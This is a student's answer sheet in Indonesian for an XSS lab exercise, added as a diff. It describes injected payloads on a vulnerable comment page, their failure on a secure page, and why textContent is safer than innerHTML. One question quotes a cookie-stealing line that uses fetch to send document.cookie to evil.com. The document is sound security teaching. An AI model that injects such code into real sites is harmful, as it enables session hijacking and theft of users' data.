@@ -1,0 +1,44 @@
+Experimen 1 
+Catat: Apa yang terjadi?
+    Jawaban : Tidak terjadi apa apa, setelah dimasukan nama dan komentar yang diminta hanya menambahkan komentar baru di kolom komentar.
+
+Experimen 2
+Kenapa ini bekerja padahal tidak ada tag <script>?
+    Jawaban : Karena browser memiliki fitur Event Handler jadi meskipun tidak ada tag <script>, atribut onerror adalah perintah otomatis yang bilang ke browser: "Jika gambar ini gagal dibuka, jalankan kode JavaScript ini."
+
+Experimen 3 
+ Cookie apa yang muncul di alert?
+    Jawaban :sessionTest=hello; persistentTest=world; visitCount=188; sessionId=abc123xyz; username=JohnDoe
+ Jika attacker mengganti alert() dengan fetch('https://evil.com?cookie=' + document.cookie), apa yang akan terjadi?
+    Jawaban : Browser mengirimkan seluruh isi cookie ke website penjahat (evil.com) melalui parameter URL.
+
+Experimen 4
+Apa yang berubah di halaman?
+    Jawaban : halaman background menjadi berwarna merah
+
+Experimen 5
+1. Buka `secure.html`
+2. Coba SEMUA payload dari Eksperimen 1-4
+Jawaban 1. sama saja tidak terjadi apa apa hanya menambahkan komentar di dalam kolom komentar
+        2. Tidak terjadi apa apa, hanya menambahkan komentar baru di kolom komentar
+        3. Tidak terjadi apa apa, hanya menambahkan komentar baru di kolom komentar
+        4. Tidak terjadi apa apa, hanya menambahkan komentar baru di kolom komentar
+        di websites secure XSS tidak berhasil
+
+Experimen 6 
+Perhatikan perbedaan kode antara vulnerable dan secure:
+
+```
+// VULNERABLE
+container.innerHTML = `<div>${userInput}</div>`;
+
+// SECURE
+const div = document.createElement('div');
+div.textContent = userInput;
+container.appendChild(div);
+```
+
+**Pertanyaan:** Jelaskan dengan kata-kata sendiri mengapa versi secure tidak vulnerable terhadap XSS.
+ Jawaban    : Versi SECURE aman karena ia memperlakukan input pengguna murni sebagai teks biasa, bukan sebagai kode HTML.
+ Pada versi VULNERABLE (innerHTML): Browser diperintahkan untuk "menggambar" apa pun yang ada di dalam variabel, termasuk jika ada tag <img onerror="...">. Browser menganggapnya sebagai perintah HTML yang harus dijalankan.
+ Pada versi SECURE (textContent): Browser diperintahkan untuk "menulis" karakter apa adanya. Jika user memasukkan <img ...>, browser tidak akan mencoba menjalankan perintahnya, melainkan hanya menampilkan tulisan <img ...> di layar (seperti mengetik di Notepad).
